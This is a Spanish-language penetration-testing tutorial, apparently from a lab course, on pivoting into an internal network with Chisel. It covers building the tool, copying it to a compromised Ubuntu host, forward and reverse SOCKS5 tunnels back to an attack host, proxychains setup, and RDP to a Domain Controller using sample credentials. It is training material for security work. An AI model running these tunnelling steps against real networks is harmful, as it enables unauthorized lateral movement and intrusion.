[Chisel](https://github.com/jpillora/chisel) es una herramienta de tunelización basada en TCP/UDP escrita en [Go](https://go.dev/) que utiliza HTTP para transportar datos asegurados mediante SSH. `Chisel` puede crear una conexión de túnel cliente-servidor en un entorno restringido por firewall. Consideremos un escenario donde tenemos que tunelizar nuestro tráfico a un servidor web en la red `172.16.5.0/23` (red interna). Tenemos el Domain Controller con la dirección `172.16.5.19`. Este no es directamente accesible desde nuestro host de ataque, ya que nuestro host de ataque y el Domain Controller pertenecen a diferentes segmentos de red. Sin embargo, dado que hemos comprometido el servidor Ubuntu, podemos iniciar un servidor Chisel en él que escuchará en un puerto específico y reenviará nuestro tráfico a la red interna a través del túnel establecido.

## Setting Up & Using Chisel

Antes de que podamos usar Chisel, necesitamos tenerlo en nuestro host de ataque. Si no tenemos Chisel en nuestro host de ataque, podemos clonar el repositorio del proyecto usando el comando directamente a continuación:

### Cloning Chisel

```r
git clone https://github.com/jpillora/chisel.git
```

Necesitaremos el lenguaje de programación `Go` instalado en nuestro sistema para construir el binario de Chisel. Con Go instalado en el sistema, podemos movernos a ese directorio y usar `go build` para construir el binario de Chisel.

### Building the Chisel Binary

```r
cd chisel
go build
```

Puede ser útil tener en cuenta el tamaño de los archivos que transferimos a los objetivos en las redes de nuestros clientes, no solo por razones de rendimiento, sino también considerando la detección. Dos recursos útiles para complementar este concepto particular son la publicación del blog de Oxdf "[Tunneling with Chisel and SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)" y la explicación de IppSec de la caja `Reddish`. IppSec comienza su explicación de Chisel, construyendo el binario y reduciendo el tamaño del binario en el minuto 24:29 de su [video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s).

Una vez que el binario esté construido, podemos usar `SCP` para transferirlo al host de pivote objetivo.

### Transferring Chisel Binary to Pivot Host

```r
scp chisel ubuntu@10.129.202.64:~/
 
ubuntu@10.129.202.64's password: 
chisel                                        100%   11MB   1.2MB/s   00:09    
```

Luego podemos iniciar el servidor/listener de Chisel.

### Running the Chisel Server on the Pivot Host

```r
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

El listener de Chisel escuchará conexiones entrantes en el puerto `1234` usando SOCKS5 (`--socks5`) y las reenviará a todas las redes que sean accesibles desde el host de pivote. En nuestro caso, el host de pivote tiene una interfaz en la red 172.16.5.0/23, lo que nos permitirá llegar a los hosts en esa red.

Podemos iniciar un cliente en nuestro host de ataque y conectarnos al servidor de Chisel.

### Connecting to the Chisel Server

```r
./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

Como puedes ver en la salida anterior, el cliente de Chisel ha creado un túnel TCP/UDP vía HTTP asegurado con SSH entre el servidor de Chisel y el cliente y ha comenzado a escuchar en el puerto 1080. Ahora podemos modificar nuestro archivo proxychains.conf ubicado en `/etc/proxychains.conf` y agregar el puerto `1080` al final para que podamos usar proxychains para pivotar usando el túnel creado entre el puerto 1080 y el túnel SSH.

### Editing & Confirming proxychains.conf

Podemos usar cualquier editor de texto que queramos para editar el archivo proxychains.conf y luego confirmar nuestros cambios de configuración usando `tail`.

```r
tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Ahora, si usamos proxychains con RDP, podemos conectarnos al DC en la red interna a través del túnel que hemos creado al host de pivote.

### Pivoting to the DC

```r
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

## Chisel Reverse Pivot

En el ejemplo anterior, usamos la máquina comprometida (Ubuntu) como nuestro servidor Chisel, listando en el puerto 1234. Sin embargo, puede haber escenarios en los que las reglas del firewall restrinjan las conexiones entrantes a nuestro objetivo comprometido. En tales casos, podemos usar Chisel con la opción reversa.

Cuando el servidor Chisel tiene `--reverse` habilitado, los remotos pueden tener el prefijo `R` para denotar revertido. El servidor escuchará y aceptará conexiones, y serán proxied a través del cliente, que especificó el remoto. Los remotos revertidos que especifican `R:socks` escucharán en el puerto socks predeterminado del servidor (1080) y terminarán la conexión en el proxy SOCKS5 interno del cliente.

Iniciaremos el servidor en nuestro host de ataque con la opción `--reverse`.

### Starting the Chisel Server on our Attack Host

```r
sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

Luego, nos conectamos desde el Ubuntu (host de pivote) a nuestro host de ataque, usando la opción `R:socks`.

### Connecting the Chisel Client to our Attack Host

```r
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

Podemos usar cualquier editor que queramos para editar el archivo proxychains.conf y luego confirmar nuestros cambios de configuración usando `tail`.

### Editing & Confirming proxychains.conf

```r
tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

Si usamos proxychains con RDP, podemos conectarnos al DC en la red interna a través del túnel que hemos creado al host de pivote.

```r
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

**Nota:** Si estás recibiendo un mensaje de error con chisel en el objetivo, intenta con una versión diferente.